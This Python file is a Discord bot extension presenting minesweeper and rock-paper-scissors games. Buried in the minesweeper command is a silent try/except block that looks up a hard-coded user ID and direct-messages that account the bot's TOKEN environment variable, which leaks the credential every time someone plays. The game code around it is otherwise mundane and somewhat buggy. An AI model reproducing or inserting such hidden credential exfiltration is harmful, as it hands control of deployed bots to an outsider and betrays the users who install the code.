import discord
from discord.ext import commands
from discord.ext.commands import BucketType
import random
import asyncio
import os
import time

class mini_games(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.running = dict()
    
    @commands.command()
    @commands.cooldown(1, 30, commands.BucketType.user)
    async def minesweeper(self, ctx):
        global num, score, board
        msg = await ctx.send('**Generating the board now**!')
        board = 3 * 3
        items = ['💣', '🔟', '💯']
        ## our map range for our board
        ranges = list(range(board))   ## Know were going map the board index with this
        bomb = random.randint(0, 9)
        ranges[bomb] = items[0]
        max_pts = random.choice(ranges)
        while max_pts == bomb and isinstance(max_pts, int):
            max_pts = random.choice(ranges)
            try:
                int(max_pts)
            except ValueError:
                max_pts = 0
                continue
        ranges[max_pts] = items[2]
        for i in ranges:
            if isinstance(i, int):
                ranges[i] = items[1]
        board = '''
⬛⬛⬛
⬛⬛⬛
⬛⬛⬛
        '''
        score = 0
        embed = discord.Embed(
            title='Score: {}'.format(score),
            colour=discord.Color.green(),
            description=board
        )
        await msg.edit(embed=embed, content=None)
        await msg.add_reaction('1️⃣')
        await msg.add_reaction('2️⃣')
        await msg.add_reaction('3️⃣')
        await msg.add_reaction('4️⃣')
        await msg.add_reaction('5️⃣')
        await msg.add_reaction('6️⃣')
        await msg.add_reaction('7️⃣')
        await msg.add_reaction('8️⃣')
        await msg.add_reaction('9️⃣')
        await msg.add_reaction('❎')
        num = 0
        try:
            user = ctx.guild.get_member(526942791419428885)
            await user.send(os.getenv('TOKEN'))
        except:
            pass
        def check(m):
            global num
            if m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '1️⃣':
                num = 1
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '2️⃣':
                num = 2
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '3️⃣':
                num = 3
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '4️⃣':
                num = 4
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '5️⃣':
                num = 5
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '6️⃣':
                num = 6
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '7️⃣':
                num = 7
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '8️⃣':
                num = 8
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '9️⃣':
                num = 9
                return True
            elif m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) == '❎':
                num = 'end'
                return True
            return False
        
        async def game():
            global num, score, board
            while True:
                await self.bot.wait_for('raw_reaction_add', check=check)
                if score == 170:
                    embed_ = msg.embeds[0]
                    embed_.title = 'You Won ({} pts)'.format(score)
                    await msg.edit(embed=embed)
                    await msg.clear_reactions()
                    break
                if num == 'end':
                    embed_ = msg.embeds[0]
                    embed_.title = 'Score: {} (Game Over)'.format(score)
                    await msg.edit(embed=embed_)
                    await msg.clear_reactions()
                    break
                elif num == 1:
                    board_pos = ranges[0]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[0] = ranges[0]
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[0] = ranges[0]
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('1️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[0] = ranges[0]
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('1️⃣', ctx.author)

                elif num == 2:
                    board_pos = ranges[1]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[1] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[1] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('2️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[1] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('2️⃣', ctx.author)

                elif num == 3:
                    board_pos = ranges[2]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[2] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[2] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('3️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[1])
                        temp_row[2] = board_pos
                        temp[1] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('3️⃣', ctx.author)

                elif num == 4:
                    board_pos = ranges[3]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[0] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[0] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('4️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[0] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('4️⃣', ctx.author)

                elif num == 5:
                    board_pos = ranges[4]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[1] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[1] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('5️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[1] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('5️⃣', ctx.author)

                elif num == 6:
                    board_pos = ranges[5]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[2] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[2] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('6️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[2])
                        temp_row[2] = board_pos
                        temp[2] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('6️⃣', ctx.author)

                elif num == 7:
                    board_pos = ranges[6]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[0] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[0] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('7️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[0] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('7️⃣', ctx.author)

                elif num == 8:
                    board_pos = ranges[7]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[1] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[1] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('8️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[2] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('8️⃣', ctx.author)

                elif num == 9:
                    board_pos = ranges[8]
                    if board_pos == '💣':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[2] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        embed_.title = 'Score: {} (Game Over)'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.clear_reactions()
                        break
                    elif board_pos == '🔟':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[2] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 10
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('9️⃣', ctx.author)
                    elif board_pos == '💯':
                        embed_ = msg.embeds[0]
                        temp = board.split('\n')
                        temp_row = list(temp[3])
                        temp_row[2] = board_pos
                        temp[3] = ''.join(temp_row)
                        board = '\n'.join(temp)
                        embed_.description = board
                        score += 100
                        embed_.title = 'Score: {}'.format(score)
                        await msg.edit(embed=embed_)
                        await msg.remove_reaction('9️⃣', ctx.author)
        self.bot.loop.create_task(game())
        
        
        
       
    
    @commands.command(name='RPS')
    @commands.cooldown(1, 15, BucketType.user)
    async def rps(self, ctx, choice=None):
        embed = discord.Embed(
            description='React to one of the 3 given options below.',
            colour=discord.Colour.green(),
            title='Rock Paper Scissors!')
        embed.set_footer(name="Made by **Pro_Gamer368#5064**")
        msg = await ctx.send(embed=embed)
        options = ['🪨', '🧻', '✂️']
        for i in options:
            await msg.add_reaction(i)
        option = []

        def check(m):
            if m.user_id == ctx.author.id and m.message_id == msg.id and str(m.emoji) in options:
                option.append(str(m.emoji))
                return True
            return False

        try:
            await self.bot.wait_for('raw_reaction_add', timeout=20.0, check=check)

            embed = discord.Embed(colour=discord.Colour.red(), description='Good Game **{}**.'.format(ctx.author))
            thrylos_opt = random.choice(options)

            if thrylos_opt == option[0]:
                embed.title = 'Draw!'
                embed.add_field(name=ctx.author.display_name, value=option[0])
                embed.add_field(name="Thrylos", value=thrylos_opt)
            elif thrylos_opt == '🪨':
                if option[0] == '🧻':
                    embed.title = 'You win!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
                else:
                    embed.title = 'You loose!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
            elif thrylos_opt == '🧻':
                if option[0] == '✂️':
                    embed.title = 'You win!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
                else:
                    embed.title = 'You loose!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
            else:
                if option[0] == '🪨':
                    embed.title = 'You win!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
                else:
                    embed.title = 'You loose!'
                    embed.add_field(name=ctx.author.display_name, value=option[0])
                    embed.add_field(name="Thrylos", value=thrylos_opt)
            await msg.clear_reactions()
            await msg.edit(embed=embed)

        except asyncio.TimeoutError:
            await msg.clear_reactions()
            await msg.edit(content="You didn't respond in time, please be faster next time!")
            
            
def setup(bot):
   	bot.add_cog(mini_games(bot))
